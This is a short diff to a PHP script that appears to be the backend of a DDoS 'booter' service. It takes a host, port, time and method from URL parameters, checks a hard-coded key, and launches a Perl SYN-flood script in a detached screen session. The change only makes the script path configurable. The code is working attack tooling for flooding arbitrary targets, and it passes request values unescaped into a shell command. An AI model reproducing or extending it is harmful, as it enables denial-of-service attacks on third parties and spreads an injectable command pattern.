@@ -12,6 +12,7 @@ $action = $_GET['action'];
 
 $array = array("syn", "stop");
 $ray = array("etherealhehe");
+$directory = "REPLACEME";
 
 
 if (!empty($key)) {
@@ -71,7 +72,7 @@ if ($port > 44405) {
 
 
 if ($method == "syn") {
-    $command = "screen -dm perl syn.pl $host $port 55000 $time";
+    $command = "screen -dm perl $directory/syn.pl $host $port 55000 $time";
 }
 // if ($method == "tcp") {
 //     $command = "screen -dm /root/tcp $host 8 300000 $time";
